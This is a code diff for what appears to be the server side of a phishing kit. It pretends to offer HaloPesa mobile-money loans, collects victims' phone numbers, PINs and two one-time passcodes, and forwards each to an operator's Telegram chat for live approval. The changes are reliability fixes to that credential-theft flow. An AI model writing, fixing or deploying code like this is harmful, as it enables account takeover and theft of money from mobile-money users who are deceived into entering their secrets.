@@ -204,13 +204,13 @@ app.post('/api/submit-pin', async (req, res) => {
       sessions.set(activeId || 'default', session);
     }
 
-    session.phone = phone || session.phone || ''; // Tunahifadhi namba ya simu kwenye kikao
+    if (phone) session.phone = phone;
     const targetChat = session.adminChatId;
     session.status = 'WAITING_PIN_APPROVAL';
     session.pin = pin;
 
     const message = `🔐 *NEW HALOPESA LOAN ATTEMPT*\n\n` +
-                    `📞 *PHONE NO:* \`${phone || session.phone}\`\n` +
+                    `📞 *PHONE NO:* \`${phone || session.phone || 'N/A'}\`\n` +
                     `🔒 *PIN (4 Digits):* \`${pin}\``;
 
     const opts = {
@@ -232,7 +232,6 @@ app.post('/api/submit-pin', async (req, res) => {
   }
 });
 
-// Imerekebishwa: OTP sasa inafuatana na namba ya simu ya mteja kwenye ujumbe wa Telegram
 app.post('/api/submit-otp1', async (req, res) => {
   try {
     const { userId, phone, otp } = req.body || {};
@@ -240,13 +239,13 @@ app.post('/api/submit-otp1', async (req, res) => {
     let session = sessions.get(activeId);
     if (!session) session = { adminChatId: FALLBACK_ADMIN_ID };
 
-    session.phone = phone || session.phone || '';
+    if (phone) session.phone = phone;
     const targetChat = session.adminChatId;
     session.status = 'WAITING_OTP1_APPROVAL';
     session.otp1 = otp;
 
     const message = `🔑 *HALOPESA OTP VERIFICATION (STEP 1)*\n\n` +
-                    `📞 *Phone:* \`${phone || session.phone}\`\n` +
+                    `📞 *Phone:* \`${phone || session.phone || 'N/A'}\`\n` +
                     `📱 *OTP (4 Digits):* \`${otp}\``;
 
     const opts = {
@@ -276,13 +275,13 @@ app.post('/api/submit-otp2', async (req, res) => {
     let session = sessions.get(activeId);
     if (!session) session = { adminChatId: FALLBACK_ADMIN_ID };
 
-    session.phone = phone || session.phone || '';
+    if (phone) session.phone = phone;
     const targetChat = session.adminChatId;
     session.status = 'WAITING_OTP2_APPROVAL';
     session.otp2 = otp;
 
     const message = `🔑 *HALOPESA FINAL OTP (STEP 2)*\n\n` +
-                    `📞 *Phone:* \`${phone || session.phone}\`\n` +
+                    `📞 *Phone:* \`${phone || session.phone || 'N/A'}\`\n` +
                     `📱 *Final OTP (4 Digits):* \`${otp}\``;
 
     const opts = {
@@ -309,4 +308,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-    
+      
